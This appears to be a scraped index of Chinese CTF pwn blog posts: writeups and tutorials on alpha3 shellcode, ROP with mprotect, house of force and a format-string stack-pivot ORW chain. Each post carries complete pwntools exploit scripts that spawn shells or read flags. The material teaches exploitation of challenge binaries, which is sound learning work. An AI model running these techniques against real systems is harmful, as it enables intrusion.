需要我们修改源码 比较麻烦 再加上需要我们自己编译 所以这里直接采用这个师傅的修改版进行下载使用 https://blog.csdn.net/SmalOSnail/article/details/105236336 下载指令: git clone https://github.com/TaQini/alpha3.git 其内置了两个脚本和两个文本文件 各自对应32位和64位系统的shellcode生成脚本 我们只需要修改shellcode文本文件中的shellcode 并且指定shellcode的基地址后运行脚本 这里使用open read write函数来写入shellcode from pwn import*context.arch = &quot;amd64&quot;f = open(&quot;/home/chen/alpha3/shellcode&quot;, &#x27;w&#x27;)shellcode = asm(shellcraft.sh())f.write(shellcode)f.close() 用python2运行就好了 3的话区分了str和byte型 会导致write出错 随后cd到alpha3目录下 .&#x2F;shellcode_x??.sh shellcode基地址 这个基地址要怎么看 以mrctf2020_shellcode_revenge这一题为例 其将shellcode的地址赋值给了rax寄存器 那么call rax 就是调用shellcode 所以我们这里的shellcode基地址应该是rax if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"2023西湖论剑calc","slug":"2023西湖论剑calc","date":"2023-02-05T10:08:55.000Z","updated":"2023-09-14T17:17:28.000Z","comments":true,"path":"2023/02/05/2023西湖论剑calc/","link":"","permalink":"http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/","excerpt":"","text":"本次wp首次尝试使用视频方式表示 视频地址：2022西湖论剑 babycalc复现_哔哩哔哩_bilibili exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28066)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;:&quot;)ret_addr = 0x4005b9rdi_addr = 0x400ca3rsi_r15_addr = 0x400ca1bss_addr = 0x602510rsp_r13_r14_r15_addr = 0x400c9dread_plt = 0x4005f0read_got = elf.got[&#x27;read&#x27;]puts_plt = 0x4005d0#key = p64(0xa111423746352413)+p64(0x318c77665d48332)payload = b&#x27;24&#x27;+cyclic(0x6)+p64(ret_addr)*17payload += p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr)+p64(0)+p64(read_plt)+p64(rsp_r13_r14_r15_addr)+p64(bss_addr-0x18)payload += p8(19)+p8(36)+p8(53)+p8(70)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)#payload += keypayload = payload.ljust(0x100-0x4,b&#x27;\\x00&#x27;)payload += p32(0x38)#gdb.attach(io,&#x27;b *0x400BB8&#x27;)io.send(payload)payload = p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr+0x48)+p64(0)+p64(read_plt)#gdb.attach(io,&#x27;b *0x400c9d&#x27;)io.sendline(payload)read_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(read_addr))libc_addr = read_addr - libc.sym[&#x27;read&#x27;]success(hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"mprotect修改bss段权限","slug":"mprotect修改bss段权限","date":"2023-02-04T14:02:29.000Z","updated":"2023-09-14T17:20:04.000Z","comments":true,"path":"2023/02/04/mprotect修改bss段权限/","link":"","permalink":"http://example.com/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/","excerpt":"","text":"这一种办法一般来说不是很实用 当个额外的知识点扩展就好了 难免有的新生赛想考 在程序开启了NX保护的前提下 我们没有办法通过在bss段写入shellcode后覆盖ret addr为shellcode首地址来实现shell 这是因为bss段此时的执行权限为rw-p 意为可读可写 但不可执行 所以位于bss段的shellcode无法发挥作用 但是在c语言中存在一个mprotect函数 其作用为把自start开始的、长度为len的内存区的保护属性修改为prot指定的值 mprotect(const void *start, size_t len, int prot) prot为7时 可以设置内存区域权限为rwx-p 即可读可写可执行 这样就能让shellcode起作用 下面来看一道例题加深理解 jarvisoj_level5checksec看一下保护机制 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没开RELRO 但是开了NX ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125; 跟进一下vulnerable_function函数 ssize_t vulnerable_function()&#123; char buf[128]; // [rsp+0h] [rbp-80h] BYREF write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, buf, 0x200uLL);&#125; 有一次栈溢出的机会 不同于其他经典的ret2libc题目 这题的plt表只有read和write函数 由于write函数泄露函数真实地址需要控制三个寄存器 所以这里用csu的办法 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr)) 接下来就是构造mprotect函数来实现bss段的权限修改 同时解答一下pop rsi和pop rdx两条指令哪来的 这题是动态链接 二进制文件中是不存在这两条指令的 但是如果题目有提供libc文件 也是可以ROPgadget查找libc文件的指令 前提是我们获取了libc基址 io.recvuntil(&quot;Input:&quot;)mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = 0x4006b3rdx_addr = libc_addr + 0x1b92rsi_addr = libc_addr + 0x202f8payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0x600000)+p64(rsi_addr)+p64(0x1000)+p64(rdx_addr)+p64(7)+p64(mprotect_addr)+p64(back_addr)io.sendline(payload) gdb动调看一下mprotect函数是否生效 可以看到0x600000-0x601000的内存区域权限已经被修改为rwxp 可读可写可执行了 那么接下来我们构造read函数 并且将最后的返回地址设置为shellcode首地址 就可以获取shell io.recvuntil(&quot;Input:&quot;)bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x100)+p64(read_addr)+p64(bss_addr)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive() 当题目没有给我们libc文件的时候 这时候我们无法通过libc文件来获取pop rsi和pop rdx指令地址来构造rop链 这时候只能通过csu来 但是csu实现函数调用是使用call指令 call指令需要有一个类似于got表的地址链才能实现 比如: bss_addr(存放着main函数的地址) 这时候call bss_addr 就相当于执行main函数 所以我们跟上面一步相比 还需要多出一个read链来读入mprotect_addr exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_got = elf.got[&#x27;read&#x27;]io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x8)+p64(bss_addr)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.send(p64(mprotect_addr))io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(bss_addr)+p64(7)+p64(0x1000)+p64(0x600000)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0x8)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(bss_addr+0x8)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"house of force","slug":"house-of-force","date":"2023-02-03T14:13:56.000Z","updated":"2023-09-14T17:19:34.000Z","comments":true,"path":"2023/02/03/house-of-force/","link":"","permalink":"http://example.com/2023/02/03/house-of-force/","excerpt":"","text":"一种修改top chunk的地址来获取低地址处内存空间的chunk的办法 复习一下chunk的申请办法 是先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配 top chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加 这一过程我们来看一下源码是如何实现的 victim = av-&gt;top;//获取当前top chunk的地址size = chunksize (victim);//获取当前top chunk的大小if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)//判断式是为了保证top chunk有足够大小的空间来供此次申请//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构 &#123; remainder_size = size - nb;//remainder_size为分配chunk后的top chunk大小 remainder = chunk_at_offset (victim, nb);//remainder为分配完后的top chunk地址 av-&gt;top = remainder;//更新top chunk //下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb);//无关 忽略 void *p = chunk2mem (victim);//无关 忽略 alloc_perturb (p, bytes); return p; &#125; 首先我们需要绕过 size &gt;&#x3D; nb + MINSIZE 这个判断式 使其结果为True 才能进入if分支 我们在进行house of force漏洞利用的时候 nb通常都是负数(下面会讲 这里先知道个大概就行) 而你也可以在源码中看到 nb在计算时是被当作一个无符号正数看待的 也就是说计算机遇到负数nb时会将其转化成补码(我在计组原理的文章中有提及)这会使得nb成为一个很庞大的数 所以我们需要让top chunk的size也作为一个负数 并且这个负数的补码要是所有负数中最大的(或者大于nb即可) 所以这里通过堆溢出覆盖top chunk的size为0xffffffffffffffff 也就是-1即可 接着就是if分支中设置top chunk新的地址的算式 remainder &#x3D; chunk_at_offset (victim, nb) 相当于 victim+nb&#x3D;top_chunk 原本的top chunk地址加上实际上要分配的大小等于新的top chunk地址 而nb &#x3D; request_size + MINSIZE top_chunk &#x3D; request_addr - MINSIZE 所以request_size &#x3D; request_addr - oldtopchunk_addr - 2*MINSIZE 接下来我们用一道例题加深一下理解 hitcontraining_bambooboxchecksec看一下保护机制 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; void (**v4)(void); // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); v4 = malloc(0x10uLL); *v4 = hello_message; v4[1] = goodbye_message; (*v4)(); while ( 1 ) &#123; menu(); read(0, buf, 8uLL); switch ( atoi(buf) ) &#123; case 1: show_item(); break; case 2: add_item(); break; case 3: change_item(); break; case 4: remove_item(); break; case 5: v4[1](); exit(0); default: puts(&quot;invaild choice!!!&quot;); break; &#125; &#125;&#125; 常规的菜单题 给了输出chunk内容的机会 释放chunk的时候一同置零了指针 不存在UAF漏洞 具体来看一下main函数开头的几行代码 v4 = malloc(0x10uLL);*v4 = hello_message;v4[1] = goodbye_message;(*v4)(); 申请了0x10大小的chunk 依次存放了hello_message的地址和goodbye_message的地址 并且先执行了hello_message int hello_message()&#123; puts(&quot;There is a box with magic&quot;); return puts(&quot;what do you want to do in the box&quot;);&#125; 而goodbye_message在我们选择退出程序后的分支执行 int goodbye_message()&#123; puts(&quot;See you next time&quot;); return puts(&quot;Thanks you&quot;);&#125; 并且程序还给了一个magic函数 可以直接输出flag信息 void __noreturn magic()&#123; int fd; // [rsp+Ch] [rbp-74h] char buf[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v2; // [rsp+78h] [rbp-8h] v2 = __readfsqword(0x28u); fd = open(&quot;/home/bamboobox/flag&quot;, 0); read(fd, buf, 0x64uLL); close(fd); printf(&quot;%s&quot;, buf); exit(0);&#125; 所以思路就是覆盖v4这个chunk中的goodbye_message 使其为magic函数地址 为了重复申请到v4这个chunk 就需要我们调整top chunk的地址 使其为v4 chunk的地址 这样再次申请一个chunk就达成目的 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the name of item:&quot;) io.send(name)def delete(index): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the new name of the item:&quot;) io.send(name)def show(): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;) 此时我们看一下chunk布局 可以看到top chunk已经调整到了原先v4chunk的位置 我们再次申请一个chunk 看看 add(0x10,b&#x27;aaaaaaaa&#x27;*2) 可以看到成功覆盖 那么我们把垃圾数据换成magic函数的地址 就可以实现flag的泄露(不过你打buu远程不能用这种办法 他docker没还原环境) 完整exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the name of item:&quot;) io.send(name)def delete(index): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the new name of the item:&quot;) io.send(name)def show(): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;)add(0x10,payload)io.recvuntil(&quot;Your choice:&quot;)io.sendline(b&#x27;5&#x27;)io.recv() 总结一下 house of force适用于 有堆溢出 没有对申请chunk的大小做过多限制 可以获取top chunk地址低地址处的任意写的机会 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"2022西湖论剑初赛pwn-Message Board","slug":"2023西湖论剑初赛pwn-Message-Board","date":"2023-02-02T06:51:06.000Z","updated":"2023-09-14T17:17:26.000Z","comments":true,"path":"2023/02/02/2023西湖论剑初赛pwn-Message-Board/","link":"","permalink":"http://example.com/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/","excerpt":"","text":"第一次在大型比赛中拿分 蛮开心的 记录一下 checksec看一下保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/xihu2&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 顺便用xclibc改一下libc文件 方便我们本地动态调试(这题调试十分重要) ida分析一下伪代码 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v3; // rax char buf[8]; // [rsp+0h] [rbp-C0h] BYREF char dest[8]; // [rsp+8h] [rbp-B8h] BYREF char v7[176]; // [rsp+10h] [rbp-B0h] BYREF sub_401236(a1, a2, a3); if ( !dword_4040AC ) &#123; strcpy(dest, &quot;Hello, &quot;); puts(&quot;Welcome to DASCTF message board, please leave your name:&quot;); read(0, buf, 8uLL); dword_4040AC = 1; &#125; v3 = strcat(dest, buf); printf(v3); puts(&quot;Now, please say something to DASCTF:&quot;); read(0, v7, 0xC0uLL); puts(&quot;Posted Successfully~&quot;); return 0LL;&#125; sub_401236函数清空了缓存区 顺便开了沙箱 onegadget和system(“&#x2F;bin&#x2F;sh”)用不了了 接着往下分析 对dword_4040AC进行了if判断 如果为0就进入分支 分支最后将其值设置为1 应该是为了防止修改返回地址为main函数 从而反复利用格式化字符串漏洞 拥有一次向buf写入0x8字节的机会 随后将buf的内容通过strcat函数和dest字符串拼接 赋值给了v3 随后printf(v3)存在格式化字符串漏洞 接着拥有一次栈溢出的机会 但是溢出字节数只有0x10 只够我们覆盖ret addr 由于开启了沙盒 所以这里只能用栈迁移了 往栈上写入rop链 那么需要泄露栈地址和libc基址 那就通过格式化字符串漏洞泄露栈地址 gdb动调看一下偏移 位于rsp+0x70处存放着栈上的地址 那么偏移为6+0x70&#x2F;8 &#x3D; 20 泄露出来了也还没有结束 我们需要计算一下我们接下来栈溢出的变量v7在栈上的地址 当前程序中我输入的v7值为aaaaaaaa 而我们泄露出来的栈地址为0x7fffffffdef0 二者地址差值为0xd0 所以v7_addr &#x3D; stack_addr - 0xd0 from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0 接下来就是构造rop链 由于开启了沙盒禁用了execve 所以我们这里用orw的方法泄露flag 但是还需要用到pop rsi pop rdx指令 显然动态链接的情况下 二进制文件中是没有这两条指令的 所以我们还需要泄露libc基址 去libc文件中找到这两条指令 io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr)) 但是这里泄露libc基址的时候 并非泄露出来的是我预想中的puts_addr 而是_IO_do_write+177的地址 不过照样能得到libc基址就行了 接下来就是简单的构造orw链 但是由于main函数一系列的入栈出栈操作 rsp指针的指向并不会跟我们泄露libc基址时一样 所以我们还需要进行一次动态调试 找到我们第二次写入rop链时的栈地址 调试exp: 虽然该exp的orw链偏移是调试后的正确结果 但是未调试时的orw链同样也可以 只是为了找到第二次写入v7的rsp指针地址 from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)gdb.attach(io,&#x27;b *0x4013A3&#x27;)io.send(payload) 利用set $rsp &#x3D; $rsp - 0x30 来不断的抬高栈帧 我们可以找到我们写入的rop链 于是偏移就是当前程序运行泄露的stack_addr - 0x7ffc8bf40650 &#x3D; 0x170 payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr) 还有一点就是注意最后栈迁移的地址是rop链的起始地址减去一个字长 而stack_addr - 0x170是&#x2F;flag字符串的地址 所以实际上rop链的起始地址是stack_addr - 0x168 所以覆盖old_rbp的地址应为stack_addr - 0x170 完整exp: from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)io.send(payload)io.recv()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"roarctf_2019_easy_pwn","slug":"roarctf-2019-easy-pwn","date":"2023-01-29T13:31:46.000Z","updated":"2023-09-14T17:20:34.000Z","comments":true,"path":"2023/01/29/roarctf-2019-easy-pwn/","link":"","permalink":"http://example.com/2023/01/29/roarctf-2019-easy-pwn/","excerpt":"","text":"这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说 checksec看一下 保护机制全开 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida看一下伪代码 main函数很常规 就基于菜单题实现的堆 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v4; // [rsp+4h] [rbp-Ch] sub_AD0(a1, a2, a3); while ( 1 ) &#123; menu(); v4 = recv_data(v4); switch ( v4 ) &#123; case 1: create(); break; case 2: puts(&quot;Tell me the secret about you!!&quot;); edit(); break; case 3: delete(); break; case 4: show(); break; case 5: return 0LL; default: puts(&quot;Wrong try again!!&quot;); break; &#125; 